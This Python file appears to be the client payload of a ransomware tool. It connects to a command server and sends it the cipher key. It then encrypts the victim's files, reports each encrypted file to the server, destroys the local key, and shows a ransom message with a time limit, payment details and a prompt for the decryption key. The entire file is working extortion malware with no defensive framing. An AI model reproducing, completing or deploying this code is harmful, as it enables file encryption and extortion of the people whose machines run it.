from secured_protocol.src.service.baseclient import BaseClient
from payload.fileshandler import FilesHandler
from payload.gui.uermsg import UserMessage
from base64 import b64encode,b64decode
import json, datetime

"""
Payload's properties
"""
JSON_TEXT = """<JSON_TEXT>"""
JSON = json.loads(JSON_TEXT)
SERVER_IP = JSON["server"]["ip"]
PORT = JSON["server"]["port"]
ID = JSON["id"]
TIME_LIMIT = JSON["timeLimit"]
# optional properties
try:
    CONTACT = JSON["contact"]
    PAYMENT = JSON["payment"]
    PAYMENT_DETAILS = JSON["paymentDetails"]
# in case they are not properly defined
except:
    CONTACT = ""
    PAYMENT = 0
    PAYMENT_DETAILS = ""

MESSAGE = """<MESSAGE>"""
FILES_JSON = json.loads('<FILES_JSON>')
FILES = FILES_JSON["files"]

UI = JSON['UI']
FILE_ENCRYPTED = 0
ENCRYPTION_DONE = 1

class Payload:
    """
    The Payload executes all ransom operation on target's machine
    """
    def __init__(self):
        """
        Initializes data and establishes connection with server, where the payload's properties
        are registered, updated and tracked.
        """
        self.files_handler = None
        self.client = BaseClient()
        # connects to server and starts session
        self.client.connect(SERVER_IP, PORT)
        self.session = self.client.get_session()
        # sends payload's properties
        self.session.send_text(JSON_TEXT)
        # receive's payload's status
        response = self.session.receive().get_data()
        print (response)
        response = json.loads(response)
        is_active = response['active']
        if is_active:
            # continues active payload
            self.handle_active_payload(response)
        else:
            self.handle_inactive_payload(response)

    def handle_active_payload(self, encryption_data):
        """
        Continues payload's procedure if it is already registered and activated by the server.
        :param encryption_data: dict; previous already executed encryption data
        :return: None
        """
        files = encryption_data["files"]
        remaining_time = encryption_data["time"]
        key = self.session.receive().get_data()
        self.clear_data()
        self.run_ui(files, TIME_LIMIT, key, remaining_time)

    def handle_inactive_payload(self, response):
        """
        Initializes unregistered or inactive payload
        :param response: dict; payload's status
        :return: None
        """
        self.files_handler = FilesHandler(FILES)
        key = None
        if response["status"] == "Unregistered":
            key = self.files_handler.get_cipher_key()
            self.session.send_bytes(self.files_handler.get_cipher_key())
            self.encrypt()
        elif response["status"] == "Inactive":
            self.files_handler.set_cipher_key(b64encode(response['cipherKey']))
            key = self.files_handler.get_cipher_key()
            self.files_handler.set_encrypted_files(response['files'])
            self.encrypt()
        # don't load user message in case that no target files were found, ransom was paid or expired
        elif response["status"] == "No file found" or \
                        response["status"] == "Ransom paid" or \
                        response["status"] == "expired":
            return

        self.run_ui(self.files_handler.get_encrypted_files(), self.files_handler.get_date(), key)

    def notify_file_encryption(self, _file):
        """
        Notifies the server when a new file was encrypted
        :param _file: str; filename
        :return: None
        """
        self.session.send_text('{{"action": {}, "file":"{}"}}'.format(FILE_ENCRYPTED, _file))

    def encrypt(self):
        """
        Executes encryption process:
        * Initiates files handler and locates target files
        * Encrypts files
        * Updates server with encryption's properties
        * Kills cipher key
        Returns encrypted files list
        :return: list;
        """
        self.files_handler.subscribe_to_encryption_event(self.notify_file_encryption)
        self.files_handler.encrypt()
        date = datetime.datetime.now().strftime("%d/%m/%y %H:%M:%S")
        self.files_handler.set_date(date)
        encryption_data = {"action": ENCRYPTION_DONE,
                           "date": date}
        self.session.send_text(json.dumps(encryption_data))
        self.files_handler.destroy_key()

        return self.files_handler.get_encrypted_files()

    def clear_data(self):
        """
        Clears payload's data
        :return:
        """
        if self.files_handler:
            self.files_handler.destroy_key()
            self.files_handler = None
        self.client.close()

    def run_ui(self, files, time, key=None, remaining_time=None):
        """
        Run's user interface (graphic or textual)
        :param files: files list
        :param time: int; total ransom time
        :param key: bytes; cipher key for safety purpose
        :return: None
        """
        # runs GUI window
        if UI == 0:
            ui = UserMessage(MESSAGE, files, TIME_LIMIT, key, remaining_time)
        # runs terminal ui
        elif UI == 1:
            self.run_console_ui(files, time)

    def run_console_ui(self, files, time):
        """
        Runs console/terminal interface option
        :param files: list; encrypted files
        :param time: int; total ransom time
        :return: None
        """
        print (MESSAGE)
        instructions = \
            "Insert 'files' to view the encrypted files. Type 'key' to insert decryption key. Type time to view remaining time."
        print (instructions)
        while True:
            data = input('>> ')
            # prints encrypted files list
            if data == 'files':
                print (files)
            # insert cipher key option for decryption
            elif data == 'key':
                key = input("Insert key: ")
                self.files_handler.set_cipher_key(b64decode(key))
                self.files_handler.decrypt()
                break
            # show time left
            elif data == 'time':
                print (time)
            # reprint instruction
            else:
                print (instructions)

if __name__ == "__main__":
    Payload()